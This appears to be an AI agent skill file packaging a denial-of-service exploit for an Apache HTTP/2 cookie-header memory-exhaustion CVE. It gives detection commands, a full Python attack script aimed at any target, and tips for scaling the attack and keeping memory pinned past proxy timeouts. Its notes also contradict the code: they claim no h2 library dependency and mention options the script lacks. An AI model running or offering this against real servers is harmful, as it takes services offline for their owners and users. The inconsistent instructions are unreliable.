---
name: http2-cookie-bomb-dos
description: "Use when HTTP/2 target. Cookie bomb memory DoS."
---
# CVE-2026-49975 Apache HTTP/2 Cookie Bomb DoS

## Overview
Apache HTTP Server 2.4.x with `mod_http2`. A single HTTP/2 connection can send HPACK-compressed cookie headers that decompress into massive values, exhausting server memory. Combined with HTTP/2 flow control (not reading DATA frames), allocated memory is held indefinitely.

## Detection
```bash
# Check HTTP/2 support
curl -s -o /dev/null -w '%{http_version}' --http2 <TARGET>
# Returns "2" if HTTP/2

# Check Apache
curl -sI <TARGET> | grep -i 'server:.*apache'
```

## Amplification Math
4091 HPACK refs → ~4KB wire → server allocates ~16MiB per stream (4000:1 amplification, O(n²) quadratic concatenation). 10 connections × 100 streams = 1000 streams × 16MiB = **~16GiB**.

## Exploitation
```python
import h2.connection, h2.config, h2.events
import socket, ssl

def cookie_bomb(target, port=443, num_streams=100):
    ctx = ssl.create_default_context()
    ctx.set_alpn_protocols(['h2'])
    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    sock = ctx.wrap_socket(socket.create_connection((target, port)), server_hostname=target)
    
    config = h2.config.H2Configuration(client_side=True)
    conn = h2.connection.H2Connection(config=config)
    conn.initiate_connection()
    # Increase window to max
    conn.increment_flow_control_window(2**30)
    sock.sendall(conn.data_to_send())
    
    # HPACK compresses repeated cookies efficiently on wire
    # but server decompresses to full size in memory
    big_cookie = 'A' * 16384  # 16KB cookie value
    
    for i in range(1, num_streams * 2, 2):
        conn.send_headers(i, [
            (':method', 'GET'), (':path', '/'),
            (':authority', target), (':scheme', 'https'),
            ('cookie', f'bomb={big_cookie}'),
        ])
        # Don't read DATA frames — hold memory via flow control
        sock.sendall(conn.data_to_send())
    
    print(f'Sent {num_streams} streams with 16KB cookies each')
    print(f'Server memory pressure: ~{num_streams * 16 / 1024:.0f}MB minimum')
    # Keep connection open to hold memory
    import time; time.sleep(300)

cookie_bomb('<TARGET>')
```

## Amplification
- HPACK indexes the cookie after first send — subsequent streams reference by index (tiny on wire, huge in memory)
- Open multiple TCP connections × 100 streams each = GB-scale memory exhaustion
- Server won't release memory until flow control window is consumed

## Affected Versions
- Vulnerable: Apache HTTP Server 2.4.17 – 2.4.67 (all with mod_http2)
- Patched: 2.4.68+

## Pitfalls
- refs=4091 is the useful max — higher wastes wire bytes with no amplification
- `--path` should request a large resource to maximize server-side buffering
- h2c (cleartext) vs h2 (TLS) — for TLS wrap socket in ssl context with ALPN `h2`
- The PoC uses raw sockets, no `h2` library dependency
- INITIAL_WINDOW_SIZE=0 + drip-feed 1-byte WINDOW_UPDATE every 2s pins memory
- Reverse proxies may kill idle streams — decrease drip interval if needed
- Source: EQSTLab/CVE-2026-49975